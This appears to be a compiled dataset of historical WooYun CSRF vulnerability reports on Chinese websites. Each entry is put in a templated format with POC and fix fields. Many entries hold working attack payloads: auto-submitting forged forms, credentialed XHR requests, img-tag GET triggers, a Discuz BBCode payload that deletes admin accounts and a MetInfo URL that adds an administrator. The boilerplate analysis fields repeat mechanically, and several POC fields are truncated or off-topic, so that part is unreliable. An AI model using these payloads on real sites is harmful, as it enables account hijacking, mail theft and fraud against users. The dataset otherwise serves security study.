**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 博客的权限设置为GET提交，可在博文中插入链接图片，致使目标用户开放权限。

**POC**: 如https://example.com/[已脱敏] 图片链接2.在用户登录的前提下，诱使用户点击此博文，可使用户I

**绕过**: 直接利用

**修复**: 1.get修改为post提交2.token机制
---

---
### [wooyun-2015-0118046] 众筹网评论功能CSRF，可导致全站众筹项目刷评论、添加垃圾评论。
**厂商**: 众筹网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 众筹网评论功能CSRF，可导致全站众筹项目刷评论、添加垃圾评论。

**POC**: 项目评论的地方，抓包看了下，发现可以重复提交。来源Referer也未验证。看着这样的id就有一种想遍历的感觉 ：）看了下源码的链接用Python爬了下链接我的评论机~~开始干活~~The end!

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2014-049748] 电驴某处功能设计缺陷（csrf）第三弹
**厂商**: VeryCD | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：https://example.com/[已脱敏] O(∩_∩)O哈哈~

**POC**: 由于没给程序员发年终奖，三连发的缺陷。。精华这类操作都是get请求抓包得到地址：https://example.com/[已脱敏] O(∩_∩)O哈哈~

**绕过**: 直接利用

**修复**: token，并且加精这种操作的时候加个验证码，或者是询问语，不然被诱点就完蛋了。
---

---
### [wooyun-2015-0126409] 融资城 csrf一枚
**厂商**: 352.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改用户资料，拦截包：修改成功：伪造csrf恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("account=woo99&sex=1&birthday=2015-07-01&marry=0&province=16&regCity=65&provinceAdd=16&city=67&regArea=&cellphoneNumber=13500000000&homeTelephoneNumber=010-88888888

**POC**: 听说你们很大方啊，求礼物！！

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2013-023628] 乌云csrf可钓走白帽子地址
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 向厂商发送地址处是GET，且请求无token，可和厂商配合定向钓白帽子联系方式（姓名电话邮编地址……）请求如下https://example.com/[已脱敏] src上面的地址给中招的白帽子，地址就乖乖地来了。

**POC**: 请某厂商帮忙做了个测试

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2015-090857] 某通信厂商某设备设计缺陷可能导致文件数据被窃取
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关于此漏洞，相对其他web漏洞来说可能看起来危害不大，但是我觉得对于要求较高的无线路由器来讲，这对用户来说确实是算是安全性问题的。由于这个漏洞是CSRF token相关的，所以我文字说明原理为主。黑盒测试，耗费了快一天的时间来尝试，今天游戏都没来得及打。

**POC**: 1.某通信厂商TD-LTE无线路由器，型号B593s-850，花500大洋买的，高大上的产品，支持插上U盘进行FTP共享等功能，覆盖距离可达250米，真远。主要存在的问题：它在设计上存在一个csrf token窃取问题，通过http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036391] 奇艺社区CSRF可构造蠕虫
**厂商**: 奇艺 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题应用：https://example.com/[已脱敏]

**POC**: 发表"奇谈"的时候抓到了这个地址：https://example.com/[已脱敏] type="hidden" name="requestMethod" value="POST"><input type="hidden" name="requestURL" value="http" value="//t.iqiyi.com/api/feed/addChat.php"><input type="hidden" name="notsync" value=""><input type="hidden" nam

**绕过**: 直接利用

**修复**: 控制访问来源
---

---
### [wooyun-2013-022895] 图虫网利用csrf可劫持账号
**厂商**: 图虫网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改邮箱处未验证token，可通过一个精心构造的表单来修改用户的邮箱。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取邮箱。

**POC**: POC：<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=section value="basicinfo"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org

**绕过**: 直接利用

**修复**: 任何涉及用户信息的操作都应该需要随机的token求20rank，求礼物。
---

---
### [wooyun-2013-025901] 某安全论坛csrf使其他用户退出。
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某安全论坛回帖时，点击插入图片。图片地址为：https://example.com/[已脱敏]

**POC**: 点击这个网址某安全论坛就退出：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 不知道。
---

---
### [wooyun-2013-021151] 某公众平台CSRF可导致公众账号被劫持
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 虽只是一个小csrf，但考虑到对业务产生的影响，可劫持公众账号群发推送，故自评等级为高，如有不妥请调低。如图，绑定私人账号处，bind api没有采用任何token，故导致csrf。

**POC**: 为真实模拟攻击场景，用了一朋友的公众账号来测试，测试前并未向其说明为测试。构造恶意page，引诱点击。<img src=https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 略
---

---
### [wooyun-2013-017638] 某社交平台SAE普通开发者无需推荐快速认证
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先去申请普通开发者认证，然后到某社交平台开发者论坛回复插入下面的代码，把XX换成你的。例如：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加验证机制。
---

---
### [wooyun-2013-036093] 某社区某处csrf漏洞可强制账号退出
**厂商**: fmi.com.cn | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: GET www.fmi.com.cn/index.php/User/logout/ HTTP/1.1

**绕过**: 直接利用

**修复**: 不要任意退出~
---

---
### [wooyun-2013-027335] 爱丽网CSRF劫持用户账号
**厂商**: aili.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改密码的地方没有做csrf的防御，无token值。不光这一个地方，全局都没有考虑到CSRF的问题。

**POC**: 测试代码<html><head><title>CSRF TEST</title></head><body onload="javascript:fireForms()"><script language="JavaScript">var pauses = new Array( "1344" );function pausecomp(millis){var date = new Date();var curDate = null;do { curDate = new Date(); }while(curDate-date < millis);}function fireForms(){var c

**绕过**: 直接利用

**修复**: 加入随即的token值
---

---
### [wooyun-2014-062986] 英雄宽频主站3个csrf
**厂商**: 某视频网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 评论区是测试效果https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ..token
---

---
### [wooyun-2015-0164471] 某电商平台网CSRF添加收货地址
**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="action" value="DeliverAddressMgr" /><input type="hidden" name="event&#95;submit&#95;do&#95;save" value="anything" /><input type="hidden" name="from" value="mbis" /><input type="hidden" name="isFrame" value="fa

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0117747] 咕咚网漏洞小礼包（一）
**厂商**: 咕咚网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 废话就不多说了，直接上图和贴上CSRF POC的代码。开启抓包工具，然后点击关注进行抓包，抓包的请求数据我就不说了。抓包请求数据简单的讲述：向/user/follow这个目录提交：user=ID他是没有token验证的。下面我们构造一个POC表单！代码如下：<html><head><meta charset="utf-8"><title>SCRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="user" value

**绕过**: 直接利用

**修复**: 加上token验证。
---

---
### [wooyun-2013-027258] 某社交平台应该是最后一枚高危GET型CSRF发某社交平台蠕虫
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 微直播处可发表某社交平台。虽然请求是POST，但GET也可。所以，POC为加载一张图片：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 还是注意点安全吧，GET POST要分，要检测TOKEN，最好要REFERER
---

---
### [wooyun-2013-035612] 乌云zone盗刷wb漏洞
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 乌云zone上传头像地方没有检验,可以上传swf文件.你们可以看我帅气的头像https://example.com/[已脱敏] 发表帖子时,可以加载任意的swf,此时swf容器的allownetworking值为internal.你们可以看我帅气的回复https://example.com/[已脱敏] 你们都知道了.接下来就是写一个可以读取zone的token并且向指定的帖子发起感谢如果贪心的话可以while(1){do}的swf,然后传到zone自己的头像,然后发一个帖子,题目就叫<叫你不要点点一次一wb>

**POC**: 我什么也没干

**绕过**: 直接利用

**修复**: 上床的地方要验证啊混蛋好像打错了什么字
---

---
### [wooyun-2013-017155] 某在线教育投票CSRF
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某在线教育创月版，登录后进行投票，未做csrf的检查，虽然使用post，但同样支持get。同时，对referer未做足够的检测。

**POC**: 1：通过个人中心，借助群聊下手2：大讲堂好友比较少，效果很鸡肋漏洞比较鸡肋...

**绕过**: 直接利用

**修复**: 1：验证referer；2：加上token验证；
---

---
### [wooyun-2012-014234] 企鵝CSRF，可以窃取用户邮件
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某邮箱服务CSRF，基本可以为所欲为了。什么? 用POST? 什么? 有SID? 什么？有referer？ 看上去防范很全面，但其实不堪一击。demo是转发用户的邮件到指定邮箱，毫无疑问的20RANK级高危漏洞了。证明中说过程吧。

**POC**: 1.发封邮件给需要攻击的用户，带上个宝贝swf2. 可爱的预览功能哦，居然和邮箱同域，flash大展神威啊在，而且绕过referer检测。3.看看我这个flash到底是什么4.看了这flash的后果5.关键一点，如何得到SID亲爱的某互联网公司,为了方便我，在URL中就有SID!在第4步中，可以看到代码中我写死了sid。那只是因为我懒得写代码了。 似乎播放器做过手脚，我无法通过常规方法得到url,但很简单，我只需要向我控制的服务器发起一个请求，然后服务端检测referer，然后返回sid和其它参数给flash就可以了。

**绕过**: 直接利用

**修复**: 你们看着办吧。
---

---
### [wooyun-2012-016142] js hijack抓妹纸某视频网站历史浏览记录
**厂商**: 某视频网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]]=cookielist&e[]=mini_panel&s=mini&cb=any反正全部写那里了，html都拖拖的。给泡妹纸提供的参考信息？

**POC**: 妥妥的

**绕过**: 直接利用

**修复**: 判断下referer
---

---
### [wooyun-2015-0108371] 超星网CSRF漏洞（危害可重置密码）
**厂商**: 超星网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 然后我们抓包然后构造poc

**POC**: 好的我们用自己的账号测试下看绑定成功了然后我就可以找回密码了！

**绕过**: 直接利用

**修复**: 加个token
---

---
### [wooyun-2013-019564] 最新某社交平台某社交平台刷粉漏洞..
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没什么技术难度，在页面里面插入一个图片代码就行了，超级简单。至于qing博客不能插入自定义的地址的图片，只要万能的firebug出马就行了。我是没有啥影响力啊，要是有影响力，这半天刷个万千的粉丝，也是可以的。哈哈哈。感谢各位wooyun兄弟测试...至于那个qing文章的标题，和企鹅没啥关系啊。就是耸人听闻罢了，骗大家点击进来，好执行那个加粉的img 而已~ 哈哈哈~

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 哎呀，这个这个么，能别修复吗？或者修复了，送几个公仔好吗？
---

---
### [wooyun-2012-09438] 某社交平台某社交平台某站CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 比较鸡肋，用户必须先登录weibo.cn，针对手机版用户和平板用户。在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。某社交平台某社交平台PAD版似乎全站都没做CSRF防护，后果你猜~

**POC**: 发某社交平台https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加来源检验~严格对gsid的检验~不如，用POST替换掉GET？
---

---
### [wooyun-2012-013847] 某互联网公司csrf，百密必有一疏啊
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个漏洞算损人不利已了，强行并静默地关闭用户的手机邮箱。对用户而言可能是小事，对某互联网公司可能算大事了吧，用户资料任人蹂躏啊。某互联网公司passport关闭手机邮箱，使用直接的GET链接，没有使用sid认证，所以，你懂的，来个<img src>到任何用户需要认证后使用的地方，比如邮箱等，发封邮件带上这个img src给需要攻击的用户，用户只要一打开邮件，不需要做任何操作，手机邮箱就挂了。。。

**POC**: 原来的信息邮件来了，看到那叉叉了伐，中标了啊不信？进passport看一下。

**绕过**: 直接利用

**修复**: 这个你们肯定是漏眼了。。
---

---
### [wooyun-2014-087803] 当当网某处CSRF刷关注
**厂商**: 当当网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：https://example.com/[已脱敏]

**POC**: POST /callback/add_friends.php?1418964916807 HTTP/1.1Host: f.dangdang.comProxy-Connection: keep-aliveContent-Length: 36Accept: */*Origin: https://example.com/[已脱敏] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 S

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-051259] 某社交圈子发布说两句CSRF
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: referer
---

---
### [wooyun-2015-098434] phpcms设计缺陷继续CSRF
**厂商**: phpcms | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法https://example.com/[已脱敏]

**POC**: phpcms后台虽然做了全局的token，但是他的token确是保存在url中，所以可以构造先跳转后台主页获取pc_hash。我们可以用到这个dedecms的办法https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: //$_GET[pc_hash]
---

---
### [wooyun-2015-0101575] 得图网全站设计缺陷导致跨站请求伪造(CSRF)(可全站点刷粉丝等)
**厂商**: 得图网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 得图网全站设计缺陷导致跨站请求伪造(CSRF)(可全站点刷粉丝等)。

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF   POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="domain" value="********"/></form><script>document.forms[0].submit();</script></body></

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-094436] 红袖添香的漏洞时代之CSRF（可刷钱）
**厂商**: hongxiu.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 红袖添香某处没验证，导致CSRF漏洞，攻击者可以利用此漏洞刷钱

**POC**: 1、我们打开任意一个作品，然后找到那个右下角有一个送荷包得月票（这个是作者跟晋江分成的）2、 我们用Burp 截断一下看看，发现没有任何验证~~，我们接下来构造一个表单3、构造表单如下<html><body><form id="post123" name="post123" action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="txtExpense" value="1" /><input type="hidden" name="txt

**绕过**: 直接利用

**修复**: 加token之类的验证机制
---

---
### [wooyun-2014-054655] Discuz! X2.5 / X3 / X3.1 可CSRF删管理员账号
**厂商**: Discuz! | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次那个漏洞：WooYun: Discuz! X2.5 / X3 / X3.1中CSRF攻击防御可被绕过你们回复说是程序员认为不需要校验才这么设置……那这回应该算是你设计问题了吧后台删除用户页面只是单纯做了submitcheck('submit', 1)，按之前的说明，程序这里没有判断formhash，也就是说可以用于CSRF不过利用这个漏洞前提是要管理员登陆了后台，不过这个不会很麻烦吧（比如故意加点关键字进审核然后让管理员触发神马的，实在不行还能发帖钓鱼）

**POC**: 发帖插入 Discuz! 代码：[img]admin.php?frame=no&action=members&operation=clean&submit=1&uidarray=1&confirmed=yes[/img]其中修改uidarray可以删除多个指定用户被删除后的管理员会强制退出登陆，重新登录后会提示ucenter激活（discuz数据库内的用户已被删除），激活后丢失管理权上述代码稍加修改可在删除同时清空发帖数据，太危险了我也不敢试……

**绕过**: 过滤绕过

**修复**: formhash判断
---

---
### [wooyun-2015-0105354] 某社交APP两处csrf，稍有鸡肋
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 问题出现在了关注和好感处用连个测试账号测试了下，随便找个人关注下，拦截包，然后得到关注某人的具体链接把地址发给我的另外一个账号关注成功好感拿那出一样，不过要选择异性才能好感成功。这下就能伪装成高富帅，最好设置一个帅的图像，疯狂给美女们发消息，说不定还能约个炮呢！使劲约吧

**绕过**: 直接利用

**修复**: token呢？
---

---
### [wooyun-2014-071537] 用一个低级的漏洞向豌豆荚用户手机后台静默推送并安装任意应用
**厂商**: 豌豆荚 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 豌豆荚非常贴心的提供了云推送功能只要用户在手机客户端登录并允许云推送，那么网页上轻轻一点，应用就自动开始在手机上下载，但是云推送这么重要的功能却并没有做CSRF防护，给豌豆荚用户带来了风险。我们点击云推送按钮，同时抓包，发现是个POST请求，但是呆萌的程序员POST和GET不分，导致可以直接用GET发起请求，比如推送“搜狗拼音输入法”的请求如下：https://example.com/[已脱敏]

**POC**: 访问后浏览器显示：说明请求成功了，我使用多个账号进行尝试，均显示成功漏洞危害：1.在用户不知情的情况下推送并可以后台静默安装任意应用2.由于这个请求可以无限次发起，如果一个用户多次在不知情的情况下发起这个请求（比如在豌豆荚论坛的多个帖子内植入这个请求）可以进行骚扰（我自己就被十几个搜狗的下载提示搞的晕头转向）Ps.给每个豌豆荚用户装个大姨吗可好？

**绕过**: 直接利用

**修复**: CSRF防御的准则：重点功能一定要做CSRF防御，POST和GET请求区分清楚，加TOKEN，而且这个TOEK必须随机，要不然就算是一个看起来很“低级”的漏洞，也可以造成严重的影响
---

---
### [wooyun-2013-036933] 爱卡汽车网 CSRF刷帖子收藏刷人气
**厂商**: 爱卡汽车网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 你们发送消息方面的CSRF防御做得挺好的。收藏帖子这个功能却是GET请求而且没有控制来源，危害严重！基本上看一眼就收藏。瞬间刷爆抓到了两个关键的GET型CSRF，构造如下：https://example.com/[已脱敏]

**POC**: 刚发帖没多久人气瞬间 104 ，过会又涨了

**绕过**: 直接利用

**修复**: 求礼物！
---

---
### [wooyun-2013-035624] 某门户网站CSRF实例一:让蠕虫来得更猛烈些
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题URL: https://example.com/[已脱敏] 可CSRF发某社交平台。下面来看看怎么利用

**POC**: 通过上面的URL我构造了一个payload ，打开后先POST一条某社交平台，然后等5秒跳转到指定地址。<meta http-equiv="content-type" content="text/html;charset=utf-8"><h1>正在跳转...</h1><iframe id="test_iframe" src="https://example.com/[已脱敏]" style='display:none'></iframe><script>function CSRF(){test_iframe.document.write("<form id='test_form' actio

**绕过**: 直接利用

**修复**: 明天考试祝我好运...
---

---
### [wooyun-2015-0135715] 某海淘平台某处CSRF漏洞（可修改用户密码）
**厂商**: 某海淘平台.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在 个人资料处由于是GET请求直接构造下面链接，https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035719] 某搜索引擎某分站继续刷粉丝二
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、关注该妹子https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格使用post提交，加token
---

---
### [wooyun-2013-027706] 苏宁某严重缺陷+订单遍历+小CSRF
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1#子站https://example.com/[已脱敏] /lifesquare/homePage/ajax/sendMessage.htm HTTP/1.1phoneNumId=可自定义&sendInfo=%E7%BB%B4%E5%88%A9%E5%BA%B7(%E8%8B%9C%E8%93%BF%E5%9B%AD%E5%BA%97)%3A%E7%99%BD%E4%B8%8B%E5%8C%BA%E7%9F%B3%E9%97%A8%E5%9D%8E165%E5%8F%B7%E7%94%B5%E8%AF%9D%EF%BC%9A025-58854808+http%3A%2F%2Fmeishi.suning.com%2Fl

**POC**: 2#订单遍历https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 比我专业的多啊-
---

---
### [wooyun-2011-01224] 115优盘 CSRF 漏洞
**厂商**: 115.com | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 115优盘 https://example.com/[已脱敏] 大量使用 AJAX 来触发用户操作, 但 AJAX 请求不但没有使用 CSRF token, 而且使用了 GET 来触发, 导致可以轻易构造出 URL 来触发操作

**POC**: 在任何论坛发布一个链接到 https://example.com/[已脱敏] 的图片即可, 如果用户访问这个页面前曾经登录过 115网盘, 则会在用户的目录下创建一个叫fb5672 的目录

**绕过**: 直接利用

**修复**: 使用 POST 而不是 GET 来进行 AJAX, 并且使用 CSRF TOKEN 来防御基于 POST 的 CSRF 攻击
---

---
### [wooyun-2013-043900] 某生活服务CSRF
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 访问：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: token。删除用户在哪，修改有同样问题不再证明。删除是get请求，CSRF更好利用些。
---

---
### [wooyun-2014-076014] METINFO CSRF可添加管理员
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于metinfo在核心部分，存在变量覆盖漏洞 （不懂是不是）所以GET = POST , POST = GET于是可以使用GET请求来添加管理员，且添加管理员页面没有任何TOKEN防护我首先尝试增加个管理员，然后用BurpSuite抓包，再把POST请求拷贝下来，放入GET请求中。构造个CSRF URLlocalhost/metinfo/admin/admin/save.php?action=add&useid=hacked&pass1=hacked&pass2=hacked&name=Hacked&sex=0&tel=&mobile=01234567890&email=hacked%40hacked.com&某互联网公司=&msn=&taobao=&admin_introduction=&admin_group=3&langok_cn=cn&admin_op0=metinfo&admin_op

